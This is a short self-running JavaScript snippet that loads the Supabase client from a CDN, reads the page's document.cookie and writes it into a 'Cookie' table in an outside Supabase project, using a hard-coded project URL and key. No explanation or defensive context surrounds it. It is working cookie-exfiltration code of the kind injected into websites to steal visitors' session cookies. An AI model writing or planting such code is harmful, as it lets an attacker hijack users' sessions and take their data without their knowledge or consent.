(function () {

  const SUPABASE_URL = "https://viznxowojmdxkpwukhla.supabase.co";
  const SUPABASE_KEY = "sb_publishable_-dnu2H4vDls0duGO03BXaA_IfvWlAuk";

  function loadSupabase(callback) {
    const s = document.createElement("script");
    s.src = "https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2";
    s.onload = callback;
    document.head.appendChild(s);
  }

  function run() {

    const c = document.cookie;
    const supabase = window.supabase.createClient(
      SUPABASE_URL,
      SUPABASE_KEY
    );

    supabase
      .from("Cookie")
      .insert({
        text: c,
        created_at: new Date()
      });

  }

  loadSupabase(run);

})();
